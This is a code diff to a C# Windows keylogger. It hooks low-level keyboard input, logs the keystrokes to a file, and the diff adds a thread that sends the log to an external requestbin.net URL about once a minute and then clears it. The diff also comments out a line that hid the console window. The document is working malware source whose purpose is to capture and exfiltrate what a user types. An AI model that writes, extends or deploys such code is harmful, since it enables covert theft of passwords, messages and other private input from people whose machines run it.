@@ -16,10 +16,11 @@ namespace KeyStrk
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static String wordData = "";
-        private static float startTime = 0f;
 
         public static void Main()
-        {   
+        {
+            dataSender dSender = new dataSender();
+
             //Create log file if file exists make it blank 
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
             sw.Close();
@@ -28,20 +29,17 @@ namespace KeyStrk
             var handle = GetConsoleWindow();
 
             // Hide Console 
-            ShowWindow(handle, SW_HIDE);
+            //ShowWindow(handle, SW_HIDE);
 
-            
 
+            //Set up threads
             Thread hookThread = new Thread(HookInput);
-            // Thread sendData = new Thread(sendThread);
+            Thread sendData = new Thread(dSender.checkSend);
 
+            //Start threads
             hookThread.Start();
-            
-           // used for sending data over http request to a remote server
-            StreamReader sr = new StreamReader(Application.StartupPath + @"\log.txt");
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/tzdsaytz?" + sr.ReadLine());
-            sr.Close();
-            req.GetResponse();
+            sendData.Start();
+           
 
 
         }
@@ -137,4 +135,41 @@ namespace KeyStrk
         const int SW_HIDE = 0;
 
     }
+
+    //Handle sending data to remote location
+    class dataSender
+    {
+        private static int startTime = DateTime.Now.Minute;
+        
+        //Check if it is time to send 
+        public void checkSend()
+        {
+            while (true)
+            {
+                //Check if enough time has passed since last sending 
+                //set time interval here
+                if (DateTime.Now.Minute - startTime == 1)
+                {
+                    send();
+                    startTime = DateTime.Now.Minute;
+                }
+            }  
+            
+           
+        }
+
+        // used for sending data over http request to a remote server
+        private void send()
+        {
+            StreamReader sr = new StreamReader(Application.StartupPath + @"\log.txt");
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/tzdsaytz?" + sr.ReadLine());
+            sr.Close();
+            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
+            sw.Close();
+            req.GetResponse();
+        }
+
+    }
+
+
 }
